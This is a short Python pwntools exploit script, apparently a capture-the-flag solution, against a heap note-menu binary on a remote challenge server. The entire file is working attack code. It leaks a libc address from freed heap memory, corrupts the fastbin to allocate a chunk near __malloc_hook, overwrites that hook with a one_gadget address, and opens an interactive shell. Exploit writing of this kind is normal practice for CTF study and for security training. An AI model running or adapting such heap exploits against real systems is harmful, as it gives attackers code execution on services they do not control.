from pwn import *

#p = process('./pwn')
p = remote('e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com',40002)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

def create(context):
    p.sendlineafter('> ','1')
    p.sendlineafter('Your data:',context)

def show(index):
    p.sendlineafter('> ','2')
    p.sendlineafter('Info index: ',str(index))

def edit(index,context):
    p.sendlineafter('> ','3')
    p.sendlineafter('Info index: ',str(index))
    sleep(0.3)
    p.sendline(context)

def delete(index):
    p.sendlineafter('> ','4')
    p.sendlineafter('Info index: ',str(index))

create('A'*0x67)
create('A'*0x67)
create('B'*0x80)
create('B'*0x80)
create('C'*0x67)
create('A'*0x20)

delete(2)
show(3)
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 3951480
one_gadget = libc_base + 0x4526a
malloc_addr = libc_base + libc.symbols['__malloc_hook']
print hex(libc_base),hex(malloc_addr)

delete(0)
delete(4)
delete(1)
create('A'*0x67)
edit(6,p64(malloc_addr-35))
create('A'*0x67)
create('c'*0x67)
create('\x00'*0x67)
edit(9,'d'*19+p64(one_gadget))
p.sendlineafter('> ','1')
#gdb.attach(p)

p.interactive()
